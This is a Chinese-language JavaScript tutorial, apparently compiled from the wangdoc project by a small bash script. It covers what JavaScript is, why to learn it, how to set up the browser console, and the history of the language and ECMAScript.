
   .. code:: bash

      while read -r md
      do
          if [[ -f "$md" ]]; then
              sed -n 's/.*/   \0/p' $md  >> $0
          else
              echo ""  >> $0
              echo ""  >> $0
              echo $md  >> $0
              echo ""  >> $0
          fi
      done << EOF

      # 🟡1. 入门篇
         docs/basic/introduction.md
         docs/basic/history.md
         docs/basic/grammar.md

      # 🟡2. 数据类型
         docs/types/general.md
         docs/types/null-undefined-boolean.md
         docs/types/number.md
         docs/types/string.md
         docs/types/object.md
         docs/types/function.md
         docs/types/array.md

      # 🟡3. 运算符
         docs/operators/arithmetic.md
         docs/operators/comparison.md
         docs/operators/boolean.md
         docs/operators/bit.md
         docs/operators/priority.md

      # 🟡4. 语法专题
         docs/features/conversion.md
         docs/features/error.md
         docs/features/style.md
         docs/features/console.md

      # 🟡5. 标准库
         docs/stdlib/object.md
         docs/stdlib/attributes.md
         docs/stdlib/array.md
         docs/stdlib/wrapper.md
         docs/stdlib/boolean.md
         docs/stdlib/number.md
         docs/stdlib/string.md
         docs/stdlib/math.md
         docs/stdlib/date.md
         docs/stdlib/regexp.md
         docs/stdlib/json.md

      # 🟡6. 面向对象编程
         docs/oop/new.md
         docs/oop/this.md
         docs/oop/prototype.md
         docs/oop/object.md
         docs/oop/strict.md

      # 🟡7. 异步操作
         docs/async/general.md
         docs/async/timer.md
         docs/async/promise.md

      # 🟡8. DOM
         docs/dom/general.md
         docs/dom/node.md
         docs/dom/nodelist.md
         docs/dom/parentnode.md
         docs/dom/document.md
         docs/dom/element.md
         docs/dom/attributes.md
         docs/dom/text.md
         docs/dom/css.md
         docs/dom/mutationobserver.md

      # 🟡9. 事件
         docs/events/eventtarget.md
         docs/events/model.md
         docs/events/event.md
         docs/events/mouse.md
         docs/events/keyboard.md
         docs/events/progress.md
         docs/events/form.md
         docs/events/touch.md
         docs/events/drag.md
         docs/events/common.md
         docs/events/globaleventhandlers.md

      # 🟡10. 浏览器模型
         docs/bom/engine.md
         docs/bom/window.md
         docs/bom/navigator.md
         docs/bom/cookie.md
         docs/bom/xmlhttprequest.md
         docs/bom/same-origin.md
         docs/bom/cors.md
         docs/bom/storage.md
         docs/bom/history.md
         docs/bom/location.md
         docs/bom/arraybuffer.md
         docs/bom/file.md
         docs/bom/form.md
         docs/bom/indexeddb.md
         docs/bom/webworker.md

      # 🟡11. 附录：网页元素接口
         docs/elements/a.md
         docs/elements/image.md
         docs/elements/form.md
         docs/elements/input.md
         docs/elements/button.md
         docs/elements/option.md
         docs/elements/video.md
      EOF
      exit

   https://github.com/wangdoc/javascript-tutorial

   本教程全面介绍 JavaScript 核心语法，覆盖了 ES5 和 DOM 规范的所有内容。

   内容上从最简单的讲起，循序渐进、由浅入深，力求清晰易懂。所有章节都带有大量的代码实例，便于理解和模仿，可以用到实际项目中，即学即用。

   本教程适合初学者当作 JavaScript 语言入门教程，学完后就可以承担实际的网页开发工作，也适合当作日常使用的参考手册。

   JavaScript 后续新增的 ES6 语法，请看[《ES6 标准入门教程》](https://wangdoc.com/es6/)。


/🟡1. 入门篇
================================================================================

/🟠 导论
========


什么是 JavaScript 语言？
----------------------

   JavaScript 是一种轻量级的脚本语言。所谓“脚本语言”（script language），指的是它不具备开发操作系统的能力，而是只用来编写控制其他大型应用程序（比如浏览器）的“脚本”。

   JavaScript 也是一种嵌入式（embedded）语言。它本身提供的核心语法不算很多，只能用来做一些数学和逻辑运算。JavaScript 本身不提供任何与 I/O（输入/输出）相关的 API，都要靠宿主环境（host）提供，所以 JavaScript 只合适嵌入更大型的应用程序环境，去调用宿主环境提供的底层 API。

   目前，已经嵌入 JavaScript 的宿主环境有多种，最常见的环境就是浏览器，另外还有服务器环境，也就是 Node 项目。

   从语法角度看，JavaScript 语言是一种“对象模型”语言。各种宿主环境通过这个模型，描述自己的功能和操作接口，从而通过 JavaScript 控制这些功能。但是，JavaScript 并不是纯粹的“面向对象语言”，还支持其他编程范式（比如函数式编程）。这导致几乎任何一个问题，JavaScript 都有多种解决方法。阅读本书的过程中，你会诧异于 JavaScript 语法的灵活性。

   JavaScript 的核心语法部分相当精简，只包括两个部分：基本的语法构造（比如操作符、控制结构、语句）和标准库（就是一系列具有各种功能的对象比如 ``Array`` 、 ``Date`` 、 ``Math`` 等）。除此之外，各种宿主环境提供额外的 API（即只能在该环境使用的接口），以便 JavaScript 调用。以浏览器为例，它提供的额外 API 可以分成三大类。

   - 浏览器控制类：操作浏览器
   - DOM 类：操作网页的各种元素
   - Web 类：实现互联网的各种功能

   如果宿主环境是服务器，则会提供各种操作系统的 API，比如文件操作 API、网络通信 API等等。这些你都可以在 Node 环境中找到。

   本书主要介绍 JavaScript 核心语法和浏览器网页开发的基本知识，不涉及 Node。全书可以分成以下四大部分。

   - 基本语法
   - 标准库
   - 浏览器 API
   - DOM

   JavaScript 语言有多个版本。本书的内容主要基于 ECMAScript 5.1 版本，这是学习 JavaScript 语法的基础。ES6 和更新的语法请参考我写的[《ECMAScript 6入门》](http://es6.ruanyifeng.com/)。

为什么学习 JavaScript？
---------------------

   JavaScript 语言有一些显著特点，使得它非常值得学习。它既适合作为学习编程的入门语言，也适合当作日常开发的工作语言。它是目前最有希望、前途最光明的计算机语言之一。

操控浏览器的能力
~~~~~~~~~~~~~

   JavaScript 的发明目的，就是作为浏览器的内置脚本语言，为网页开发者提供操控浏览器的能力。它是目前唯一一种通用的浏览器脚本语言，所有浏览器都支持。它可以让网页呈现各种特殊效果，为用户提供良好的互动体验。

   目前，全世界几乎所有网页都使用 JavaScript。如果不用，网站的易用性和使用效率将大打折扣，无法成为操作便利、对用户友好的网站。

   对于一个互联网开发者来说，如果你想提供漂亮的网页、令用户满意的上网体验、各种基于浏览器的便捷功能、前后端之间紧密高效的联系，JavaScript 是必不可少的工具。

广泛的使用领域
~~~~~~~~~~~~

   近年来，JavaScript 的使用范围，慢慢超越了浏览器，正在向通用的系统语言发展。

   **（1）浏览器的平台化**

   随着 HTML5 的出现，浏览器本身的功能越来越强，不再仅仅能浏览网页，而是越来越像一个平台，JavaScript 因此得以调用许多系统功能，比如操作本地文件、操作图片、调用摄像头和麦克风等等。这使得 JavaScript 可以完成许多以前无法想象的事情。

   **（2）Node**

   Node 项目使得 JavaScript 可以用于开发服务器端的大型项目，网站的前后端都用 JavaScript 开发已经成为了现实。有些嵌入式平台（Raspberry Pi）能够安装 Node，于是 JavaScript 就能为这些平台开发应用程序。

   **（3）数据库操作**

   JavaScript 甚至也可以用来操作数据库。NoSQL 数据库这个概念，本身就是在 JSON（JavaScript Object Notation）格式的基础上诞生的，大部分 NoSQL 数据库允许 JavaScript 直接操作。基于 SQL 语言的开源数据库 PostgreSQL 支持 JavaScript 作为操作语言，可以部分取代 SQL 查询语言。

   **（4）移动平台开发**

   JavaScript 也正在成为手机应用的开发语言。一般来说，安卓平台使用 Java 语言开发，iOS 平台使用 Objective-C 或 Swift 语言开发。许多人正在努力，让 JavaScript 成为各个平台的通用开发语言。

   PhoneGap 项目就是将 JavaScript 和 HTML5 打包在一个容器之中，使得它能同时在 iOS 和安卓上运行。Facebook 公司的 React Native 项目则是将 JavaScript 写的组件，编译成原生组件，从而使它们具备优秀的性能。

   Mozilla 基金会的手机操作系统 Firefox OS，更是直接将 JavaScript 作为操作系统的平台语言，但是很可惜这个项目没有成功。

   **（5）内嵌脚本语言**

   越来越多的应用程序，将 JavaScript 作为内嵌的脚本语言，比如 Adobe 公司的著名 PDF 阅读器 Acrobat、Linux 桌面环境 GNOME 3。

   **（6）跨平台的桌面应用程序**

   Chromium OS、Windows 8 等操作系统直接支持 JavaScript 编写应用程序。Mozilla 的 Open Web Apps 项目、Google 的 [Chrome App 项目](http://developer.chrome.com/apps/about_apps)、GitHub 的 [Electron 项目](http://electron.atom.io/)、以及 [TideSDK 项目](http://tidesdk.multipart.net/docs/user-dev/generated/)，都可以用来编写运行于 Windows、Mac OS 和 Android 等多个桌面平台的程序，不依赖浏览器。

   **（7）小结**

   可以预期，JavaScript 最终将能让你只用一种语言，就开发出适应不同平台（包括桌面端、服务器端、手机端）的程序。早在2013年9月的[统计](http://adambard.com/blog/top-github-languages-for-2013-so-far/)之中，JavaScript 就是当年 GitHub 上使用量排名第一的语言。

   著名程序员 Jeff Atwood 甚至提出了一条 [“Atwood 定律”](http://www.codinghorror.com/blog/2007/07/the-principle-of-least-power.html)：

   > “所有可以用 JavaScript 编写的程序，最终都会出现 JavaScript 的版本。”(Any application that can be written in JavaScript will eventually be written in JavaScript.)

易学性
~~~~~

   相比学习其他语言，学习 JavaScript 有一些有利条件。

   **（1）学习环境无处不在**

   只要有浏览器，就能运行 JavaScript 程序；只要有文本编辑器，就能编写 JavaScript 程序。这意味着，几乎所有电脑都原生提供 JavaScript 学习环境，不用另行安装复杂的 IDE（集成开发环境）和编译器。

   **（2）简单性**

   相比其他脚本语言（比如 Python 或 Ruby），JavaScript 的语法相对简单一些，本身的语法特性并不是特别多。而且，那些语法中的复杂部分，也不是必需要学会。你完全可以只用简单命令，完成大部分的操作。

   **（3）与主流语言的相似性**

   JavaScript 的语法很类似 C/C++ 和 Java，如果学过这些语言（事实上大多数学校都教），JavaScript 的入门会非常容易。

   必须说明的是，虽然核心语法不难，但是 JavaScript 的复杂性体现在另外两个方面。

   首先，它涉及大量的外部 API。JavaScript 要发挥作用，必须与其他组件配合，这些外部组件五花八门，数量极其庞大，几乎涉及网络应用的各个方面，掌握它们绝非易事。

   其次，JavaScript 语言有一些设计缺陷。某些地方相当不合理，另一些地方则会出现怪异的运行结果。学习 JavaScript，很大一部分时间是用来搞清楚哪些地方有陷阱。Douglas Crockford 写过一本有名的书，名字就叫[《JavaScript: The Good Parts》](http://javascript.crockford.com/)，言下之意就是这门语言不好的地方很多，必须写一本书才能讲清楚。另外一些程序员则感到，为了更合理地编写 JavaScript 程序，就不能用 JavaScript 来写，而必须发明新的语言，比如 CoffeeScript、TypeScript、Dart 这些新语言的发明目的，多多少少都有这个因素。

   尽管如此，目前看来，JavaScript 的地位还是无法动摇。加之，语言标准的快速进化，使得 JavaScript 功能日益增强，而语法缺陷和怪异之处得到了弥补。所以，JavaScript 还是值得学习，况且它的入门真的不难。

强大的性能
~~~~~~~~

   JavaScript 的性能优势体现在以下方面。

   **（1）灵活的语法，表达力强。**

   JavaScript 既支持类似 C 语言清晰的过程式编程，也支持灵活的函数式编程，可以用来写并发处理（concurrent）。这些语法特性已经被证明非常强大，可以用于许多场合，尤其适用异步编程。

   JavaScript 的所有值都是对象，这为程序员提供了灵活性和便利性。因为你可以很方便地、按照需要随时创造数据结构，不用进行麻烦的预定义。

   JavaScript 的标准还在快速进化中，并不断合理化，添加更适用的语法特性。

   **（2）支持编译运行。**

   JavaScript 语言本身，虽然是一种解释型语言，但是在现代浏览器中，JavaScript 都是编译后运行。程序会被高度优化，运行效率接近二进制程序。而且，JavaScript 引擎正在快速发展，性能将越来越好。

   此外，还有一种 WebAssembly 格式，它是 JavaScript 引擎的中间码格式，全部都是二进制代码。由于跳过了编译步骤，可以达到接近原生二进制代码的运行速度。各种语言（主要是 C 和 C++）通过编译成 WebAssembly，就可以在浏览器里面运行。

   **（3）事件驱动和非阻塞式设计。**

   JavaScript 程序可以采用事件驱动（event-driven）和非阻塞式（non-blocking）设计，在服务器端适合高并发环境，普通的硬件就可以承受很大的访问量。

开放性
~~~~~

   JavaScript 是一种开放的语言。它的标准 ECMA-262 是 ISO 国际标准，写得非常详尽明确；该标准的主要实现（比如 V8 和 SpiderMonkey 引擎）都是开放的，而且质量很高。这保证了这门语言不属于任何公司或个人，不存在版权和专利的问题。

   语言标准由 TC39 委员会负责制定，该委员会的运作是透明的，所有讨论都是开放的，会议记录都会对外公布。

   不同公司的 JavaScript 运行环境，兼容性很好，程序不做调整或只做很小的调整，就能在所有浏览器上运行。

社区支持和就业机会
~~~~~~~~~~~~~~~

   全世界程序员都在使用 JavaScript，它有着极大的社区、广泛的文献和图书、丰富的代码资源。绝大部分你需要用到的功能，都有多个开源函数库可供选用。

   作为项目负责人，你不难招聘到数量众多的 JavaScript 程序员；作为开发者，你也不难找到一份 JavaScript 的工作。

实验环境
-------

   本教程包含大量的示例代码，只要电脑安装了浏览器，就可以用来实验了。读者可以一边读一边运行示例，加深理解。

   推荐安装 Chrome 浏览器，它的“开发者工具”（Developer Tools）里面的“控制台”（console），就是运行 JavaScript 代码的理想环境。

   进入 Chrome 浏览器的“控制台”，有两种方法。

   - 直接进入：按下 ``Option + Command + J``（Mac）或者 ``Ctrl + Shift + J``（Windows / Linux）
   - 开发者工具进入：开发者工具的快捷键是 F12，或者 ``Option + Command + I``（Mac）以及 ``Ctrl + Shift + I``（Windows / Linux），然后选择 Console 面板

   进入控制台以后，就可以在提示符后输入代码，然后按 ``Enter`` 键，代码就会执行。如果按 ``Shift + Enter`` 键，就是代码换行，不会触发执行。建议阅读本教程时，将代码复制到控制台进行实验。

   作为尝试，你可以将下面的程序复制到“控制台”，按下回车后，就可以看到运行结果。

   .. code:: javascript

      function greetMe(yourName) {
        console.log('Hello ' + yourName);
      }
   
      greetMe('World')
      // Hello World

/🟠 JavaScript 语言的历史
========================

   JavaScript 因为互联网而生，紧跟着浏览器的出现而问世。回顾它的历史，就要从浏览器的历史讲起。

   1990年底，欧洲核能研究组织（CERN）科学家 Tim Berners-Lee，在全世界最大的电脑网络——互联网的基础上，发明了万维网（World Wide Web），从此可以在网上浏览网页文件。最早的网页只能在操作系统的终端里浏览，也就是说只能使用命令行操作，网页都是在字符窗口中显示，这当然非常不方便。

   1992年底，美国国家超级电脑应用中心（NCSA）开始开发一个独立的浏览器，叫做 Mosaic。这是人类历史上第一个浏览器，从此网页可以在图形界面的窗口浏览。

   1994年10月，NCSA 的一个主要程序员 Marc Andreessen 联合风险投资家 Jim Clark，成立了 Mosaic 通信公司（Mosaic Communications），不久后改名为 Netscape。这家公司的方向，就是在 Mosaic 的基础上，开发面向普通用户的新一代的浏览器 Netscape Navigator。

   1994年12月，Navigator 发布了1.0版，市场份额一举超过90%。

   Netscape 公司很快发现，Navigator 浏览器需要一种可以嵌入网页的脚本语言，用来控制浏览器行为。当时，网速很慢而且上网费很贵，有些操作不宜在服务器端完成。比如，如果用户忘记填写“用户名”，就点了“发送”按钮，到服务器再发现这一点就有点太晚了，最好能在用户发出数据之前，就告诉用户“请填写用户名”。这就需要在网页中嵌入小程序，让浏览器检查每一栏是否都填写了。

   管理层对这种浏览器脚本语言的设想是：功能不需要太强，语法较为简单，容易学习和部署。那一年，正逢 Sun 公司的 Java 语言问世，市场推广活动非常成功。Netscape 公司决定与 Sun 公司合作，浏览器支持嵌入 Java 小程序（后来称为 Java applet）。但是，浏览器脚本语言是否就选用 Java，则存在争论。后来，还是决定不使用 Java，因为网页小程序不需要 Java 这么“重”的语法。但是，同时也决定脚本语言的语法要接近 Java，并且可以支持 Java 程序。这些设想直接排除了使用现存语言，比如 Perl、Python 和 TCL。

   1995年，Netscape 公司雇佣了程序员 Brendan Eich 开发这种网页脚本语言。Brendan Eich 有很强的函数式编程背景，希望以 Scheme 语言（函数式语言鼻祖 LISP 语言的一种方言）为蓝本，实现这种新语言。

   1995年5月，Brendan Eich 只用了10天，就设计完成了这种语言的第一版。它是一个大杂烩，语法有多个来源。

   - 基本语法：借鉴 C 语言和 Java 语言。
   - 数据结构：借鉴 Java 语言，包括将值分成原始值和对象两大类。
   - 函数的用法：借鉴 Scheme 语言和 Awk 语言，将函数当作第一等公民，并引入闭包。
   - 原型继承模型：借鉴 Self 语言（Smalltalk 的一种变种）。
   - 正则表达式：借鉴 Perl 语言。
   - 字符串和数组处理：借鉴 Python 语言。

   为了保持简单，这种脚本语言缺少一些关键的功能，比如块级作用域、模块、子类型（subtyping）等等，但是可以利用现有功能找出解决办法。这种功能的不足，直接导致了后来 JavaScript 的一个显著特点：对于其他语言，你需要学习语言的各种功能，而对于 JavaScript，你常常需要学习各种解决问题的模式。而且由于来源多样，从一开始就注定，JavaScript 的编程风格是函数式编程和面向对象编程的一种混合体。

   Netscape 公司的这种浏览器脚本语言，最初名字叫做 Mocha，1995年9月改为 LiveScript。12月，Netscape 公司与 Sun 公司（Java 语言的发明者和所有者）达成协议，后者允许将这种语言叫做 JavaScript。这样一来，Netscape 公司可以借助 Java 语言的声势，而 Sun 公司则将自己的影响力扩展到了浏览器。

   之所以起这个名字，并不是因为 JavaScript 本身与 Java 语言有多么深的关系（事实上，两者关系并不深，详见下节），而是因为 Netscape 公司已经决定，使用 Java 语言开发网络应用程序，JavaScript 可以像胶水一样，将各个部分连接起来。当然，后来的历史是 Java 语言的浏览器插件失败了，JavaScript 反而发扬光大。

   1995年12月4日，Netscape 公司与 Sun 公司联合发布了 JavaScript 语言，对外宣传 JavaScript 是 Java 的补充，属于轻量级的 Java，专门用来操作网页。

   1996年3月，Navigator 2.0 浏览器正式内置了 JavaScript 脚本语言。

JavaScript 与 Java 的关系
------------------------

   这里专门说一下 JavaScript 和 Java 的关系。它们是两种不一样的语言，但是彼此存在联系。

   JavaScript 的基本语法和对象体系，是模仿 Java 而设计的。但是，JavaScript 没有采用 Java 的静态类型。正是因为 JavaScript 与 Java 有很大的相似性，所以这门语言才从一开始的 LiveScript 改名为 JavaScript。基本上，JavaScript 这个名字的原意是“很像Java的脚本语言”。

   JavaScript 语言的函数是一种独立的数据类型，以及采用基于原型对象（prototype）的继承链。这是它与 Java 语法最大的两点区别。JavaScript 语法要比 Java 自由得多。

   另外，Java 语言需要编译，而 JavaScript 语言则是运行时由解释器直接执行。

   总之，JavaScript 的原始设计目标是一种小型的、简单的动态语言，与 Java 有足够的相似性，使得使用者（尤其是 Java 程序员）可以快速上手。

JavaScript 与 ECMAScript 的关系
------------------------------

   1996年8月，微软模仿 JavaScript 开发了一种相近的语言，取名为JScript（JavaScript 是 Netscape 的注册商标，微软不能用），首先内置于IE 3.0。Netscape 公司面临丧失浏览器脚本语言的主导权的局面。

   1996年11月，Netscape 公司决定将 JavaScript 提交给国际标准化组织 ECMA（European Computer Manufacturers Association），希望 JavaScript 能够成为国际标准，以此抵抗微软。ECMA 的39号技术委员会（Technical Committee 39）负责制定和审核这个标准，成员由业内的大公司派出的工程师组成，目前共25个人。该委员会定期开会，所有的邮件讨论和会议记录，都是公开的。

   1997年7月，ECMA 组织发布262号标准文件（ECMA-262）的第一版，规定了浏览器脚本语言的标准，并将这种语言称为 ECMAScript。这个版本就是 ECMAScript 1.0 版。之所以不叫 JavaScript，一方面是由于商标的关系，Java 是 Sun 公司的商标，根据一份授权协议，只有 Netscape 公司可以合法地使用 JavaScript 这个名字，且 JavaScript 已经被 Netscape 公司注册为商标，另一方面也是想体现这门语言的制定者是 ECMA，不是 Netscape，这样有利于保证这门语言的开放性和中立性。因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现。在日常场合，这两个词是可以互换的。

   ECMAScript 只用来标准化 JavaScript 这种语言的基本语法结构，与部署环境相关的标准都由其他标准规定，比如 DOM 的标准就是由 W3C组织（World Wide Web Consortium）制定的。

   ECMA-262 标准后来也被另一个国际标准化组织 ISO（International Organization for Standardization）批准，标准号是 ISO-16262。

JavaScript 的版本
----------------

   1997年7月，ECMAScript 1.0发布。

   1998年6月，ECMAScript 2.0版发布。

   1999年12月，ECMAScript 3.0版发布，成为 JavaScript 的通行标准，得到了广泛支持。

   2007年10月，ECMAScript 4.0版草案发布，对3.0版做了大幅升级，预计次年8月发布正式版本。草案发布后，由于4.0版的目标过于激进，各方对于是否通过这个标准，发生了严重分歧。以 Yahoo、Microsoft、Google 为首的大公司，反对 JavaScript 的大幅升级，主张小幅改动；以 JavaScript 创造者 Brendan Eich 为首的 Mozilla 公司，则坚持当前的草案。

   2008年7月，由于对于下一个版本应该包括哪些功能，各方分歧太大，争论过于激进，ECMA 开会决定，中止 ECMAScript 4.0 的开发（即废除了这个版本），将其中涉及现有功能改善的一小部分，发布为 ECMAScript 3.1，而将其他激进的设想扩大范围，放入以后的版本，由于会议的气氛，该版本的项目代号起名为 Harmony（和谐）。会后不久，ECMAScript 3.1 就改名为 ECMAScript 5。

   2009年12月，ECMAScript 5.0版 正式发布。Harmony 项目则一分为二，一些较为可行的设想定名为 JavaScript.next 继续开发，后来演变成 ECMAScript 6；一些不是很成熟的设想，则被视为 JavaScript.next.next，在更远的将来再考虑推出。TC39 的总体考虑是，ECMAScript 5 与 ECMAScript 3 基本保持兼容，较大的语法修正和新功能加入，将由 JavaScript.next 完成。当时，JavaScript.next 指的是ECMAScript 6。第六版发布以后，将指 ECMAScript 7。TC39 预计，ECMAScript 5 会在2013年的年中成为 JavaScript 开发的主流标准，并在此后五年中一直保持这个位置。

   2011年6月，ECMAScript 5.1版发布，并且成为 ISO 国际标准（ISO/IEC 16262:2011）。到了2012年底，所有主要浏览器都支持 ECMAScript 5.1版的全部功能。

   2013年3月，ECMAScript 6 草案冻结，不再添加新功能。新的功能设想将被放到 ECMAScript 7。

   2013年12月，ECMAScript 6 草案发布。然后是12个月的讨论期，听取各方反馈。

   2015年6月，ECMAScript 6 正式发布，并且更名为“ECMAScript 2015”。这是因为 TC39 委员会计划，以后每年发布一个 ECMAScript 的版本，下一个版本在2016年发布，称为“ECMAScript 2016”，2017年发布“ECMAScript 2017”，以此类推。

周边大事记
--------

   JavaScript 伴随着互联网的发展一起发展。互联网周边技术的快速发展，刺激和推动了 JavaScript 语言的发展。下面，回顾一下 JavaScript 的周边应用发展。

   1996年，样式表标准 CSS 第一版发布。

   1997年，DHTML（Dynamic HTML，动态 HTML）发布，允许动态改变网页内容。这标志着 DOM 模式（Document Object Model，文档对象模型）正式应用。

   1998年，Netscape 公司开源了浏览器，这导致了 Mozilla 项目的诞生。几个月后，美国在线（AOL）宣布并购 Netscape。

   1999年，IE 5部署了 XMLHttpRequest 接口，允许 JavaScript 发出 HTTP 请求，为后来大行其道的 Ajax 应用创造了条件。

   2000年，KDE 项目重写了浏览器引擎 KHTML，为后来的 WebKit 和 Blink 引擎打下基础。这一年的10月23日，KDE 2.0发布，第一次将 KHTML 浏览器包括其中。

   2001年，微软公司时隔5年之后，发布了 IE 浏览器的下一个版本 Internet Explorer 6。这是当时最先进的浏览器，它后来统治了浏览器市场多年。

   2001年，Douglas Crockford 提出了 JSON 格式，用于取代 XML 格式，进行服务器和网页之间的数据交换。JavaScript 可以原生支持这种格式，不需要额外部署代码。

   2002年，Mozilla 项目发布了它的浏览器的第一版，后来起名为 Firefox。

   2003年，苹果公司发布了 Safari 浏览器的第一版。

   2004年，Google 公司发布了 Gmail，促成了互联网应用程序（Web Application）这个概念的诞生。由于 Gmail 是在4月1日发布的，很多人起初以为这只是一个玩笑。

   2004年，Dojo 框架诞生，为不同浏览器提供了同一接口，并为主要功能提供了便利的调用方法。这标志着 JavaScript 编程框架的时代开始来临。

   2004年，WHATWG 组织成立，致力于加速 HTML 语言的标准化进程。

   2005年，苹果公司在 KHTML 引擎基础上，建立了 WebKit 引擎。

   2005年，Ajax 方法（Asynchronous JavaScript and XML）正式诞生，Jesse James Garrett 发明了这个词汇。它开始流行的标志是，2月份发布的 Google Maps 项目大量采用该方法。它几乎成了新一代网站的标准做法，促成了 Web 2.0时代的来临。

   2005年，Apache 基金会发布了 CouchDB 数据库。这是一个基于 JSON 格式的数据库，可以用 JavaScript 函数定义视图和索引。它在本质上有别于传统的关系型数据库，标识着 NoSQL 类型的数据库诞生。

   2006年，jQuery 函数库诞生，作者为John Resig。jQuery 为操作网页 DOM 结构提供了非常强大易用的接口，成为了使用最广泛的函数库，并且让 JavaScript 语言的应用难度大大降低，推动了这种语言的流行。

   2006年，微软公司发布 IE 7，标志重新开始启动浏览器的开发。

   2006年，Google推出 Google Web Toolkit 项目（缩写为 GWT），提供 Java 编译成 JavaScript 的功能，开创了将其他语言转为 JavaScript 的先河。

   2007年，Webkit 引擎在 iPhone 手机中得到部署。它最初基于 KDE 项目，2003年苹果公司首先采用，2005年开源。这标志着 JavaScript 语言开始能在手机中使用了，意味着有可能写出在桌面电脑和手机中都能使用的程序。

   2007年，Douglas Crockford 发表了名为《JavaScript: The good parts》的演讲，次年由 O'Reilly 出版社出版。这标志着软件行业开始严肃对待 JavaScript 语言，对它的语法开始重新认识。

   2008年，V8 编译器诞生。这是 Google 公司为 Chrome 浏览器而开发的，它的特点是让 JavaScript 的运行变得非常快。它提高了 JavaScript 的性能，推动了语法的改进和标准化，改变外界对 JavaScript 的不佳印象。同时，V8 是开源的，任何人想要一种快速的嵌入式脚本语言，都可以采用 V8，这拓展了 JavaScript 的应用领域。

   2009年，Node.js 项目诞生，创始人为 Ryan Dahl，它标志着 JavaScript 可以用于服务器端编程，从此网站的前端和后端可以使用同一种语言开发。并且，Node.js 可以承受很大的并发流量，使得开发某些互联网大规模的实时应用变得容易。

   2009年，Jeremy Ashkenas 发布了 CoffeeScript 的最初版本。CoffeeScript 可以被转换为 JavaScript 运行，但是语法要比 JavaScript 简洁。这开启了其他语言转为 JavaScript 的风潮。

   2009年，PhoneGap 项目诞生，它将 HTML5 和 JavaScript 引入移动设备的应用程序开发，主要针对 iOS 和 Android 平台，使得 JavaScript 可以用于跨平台的应用程序开发。

   2009，Google 发布 Chrome OS，号称是以浏览器为基础发展成的操作系统，允许直接使用 JavaScript 编写应用程序。类似的项目还有 Mozilla 的 Firefox OS。

   2010年，三个重要的项目诞生，分别是 NPM、BackboneJS 和 RequireJS，标志着 JavaScript 进入模块化开发的时代。

   2011年，微软公司发布 Windows 8操作系统，将 JavaScript 作为应用程序的开发语言之一，直接提供系统支持。

   2011年，Google 发布了 Dart 语言，目的是为了结束 JavaScript 语言在浏览器中的垄断，提供更合理、更强大的语法和功能。Chromium浏览器有内置的 Dart 虚拟机，可以运行 Dart 程序，但 Dart 程序也可以被编译成 JavaScript 程序运行。

   2011年，微软工程师[Scott Hanselman](http://www.hanselman.com/blog/JavaScriptIsAssemblyLanguageForTheWebSematicMarkupIsDeadCleanVsMachinecodedHTML.aspx)提出，JavaScript 将是互联网的汇编语言。因为它无所不在，而且正在变得越来越快。其他语言的程序可以被转成 JavaScript 语言，然后在浏览器中运行。

   2012年，单页面应用程序框架（single-page app framework）开始崛起，AngularJS 项目和 Ember 项目都发布了1.0版本。

   2012年，微软发布 TypeScript 语言。该语言被设计成 JavaScript 的超集，这意味着所有 JavaScript 程序，都可以不经修改地在 TypeScript 中运行。同时，TypeScript 添加了很多新的语法特性，主要目的是为了开发大型程序，然后还可以被编译成 JavaScript 运行。

   2012年，Mozilla 基金会提出 [asm.js](http://asmjs.org/) 规格。asm.js 是 JavaScript 的一个子集，所有符合 asm.js 的程序都可以在浏览器中运行，它的特殊之处在于语法有严格限定，可以被快速编译成性能良好的机器码。这样做的目的，是为了给其他语言提供一个编译规范，使其可以被编译成高效的 JavaScript 代码。同时，Mozilla 基金会还发起了 [Emscripten](https://github.com/kripken/emscripten/wiki) 项目，目标就是提供一个跨语言的编译器，能够将 LLVM 的位代码（bitcode）转为 JavaScript 代码，在浏览器中运行。因为大部分 LLVM 位代码都是从 C / C++ 语言生成的，这意味着 C / C++ 将可以在浏览器中运行。此外，Mozilla 旗下还有 [LLJS](http://mbebenita.github.io/LLJS/) （将 JavaScript 转为 C 代码）项目和 [River Trail](https://github.com/RiverTrail/RiverTrail/wiki) （一个用于多核心处理器的 ECMAScript 扩展）项目。目前，可以被编译成 JavaScript 的[语言列表](https://github.com/jashkenas/coffee-script/wiki/List-of-languages-that-compile-to-JS)，共有将近40种语言。

   2013年，Mozilla 基金会发布手机操作系统 Firefox OS，该操作系统的整个用户界面都使用 JavaScript。

   2013年，ECMA 正式推出 JSON 的[国际标准](http://www.ecma-international.org/publications/standards/Ecma-404.htm)，这意味着 JSON 格式已经变得与 XML 格式一样重要和正式了。

   2013年5月，Facebook 发布 UI 框架库 React，引入了新的 JSX 语法，使得 UI 层可以用组件开发，同时引入了网页应用是状态机的概念。

   2014年，微软推出 JavaScript 的 Windows 库 WinJS，标志微软公司全面支持 JavaScript 与 Windows 操作系统的融合。

   2014年11月，由于对 Joyent 公司垄断 Node 项目、以及该项目进展缓慢的不满，一部分核心开发者离开了 Node.js，创造了 io.js 项目，这是一个更开放、更新更频繁的 Node.js 版本，很短时间内就发布到了2.0版。三个月后，Joyent 公司宣布放弃对 Node 项目的控制，将其转交给新成立的开放性质的 Node 基金会。随后，io.js 项目宣布回归 Node，两个版本将合并。

   2015年3月，Facebook 公司发布了 React Native 项目，将 React 框架移植到了手机端，可以用来开发手机 App。它会将 JavaScript 代码转为 iOS 平台的 Objective-C 代码，或者 Android 平台的 Java 代码，从而为 JavaScript 语言开发高性能的原生 App 打开了一条道路。

   2015年4月，Angular 框架宣布，2.0 版将基于微软公司的TypeScript语言开发，这等于为 JavaScript 语言引入了强类型。

   2015年5月，Node 模块管理器 NPM 超越 CPAN，标志着 JavaScript 成为世界上软件模块最多的语言。

   2015年5月，Google 公司的 Polymer 框架发布1.0版。该项目的目标是生产环境可以使用 WebComponent 组件，如果能够达到目标，Web 开发将进入一个全新的以组件为开发基础的阶段。

   2015年6月，ECMA 标准化组织正式批准了 ECMAScript 6 语言标准，定名为《ECMAScript 2015 标准》。JavaScript 语言正式进入了下一个阶段，成为一种企业级的、开发大规模应用的语言。这个标准从提出到批准，历时10年，而 JavaScript 语言从诞生至今也已经20年了。

   2015年6月，Mozilla 在 asm.js 的基础上发布 WebAssembly 项目。这是一种 JavaScript 引擎的中间码格式，全部都是二进制，类似于 Java 的字节码，有利于移动设备加载 JavaScript 脚本，执行速度提高了 20+ 倍。这意味着将来的软件，会发布 JavaScript 二进制包。

   2016年6月，《ECMAScript 2016 标准》发布。与前一年发布的版本相比，它只增加了两个较小的特性。

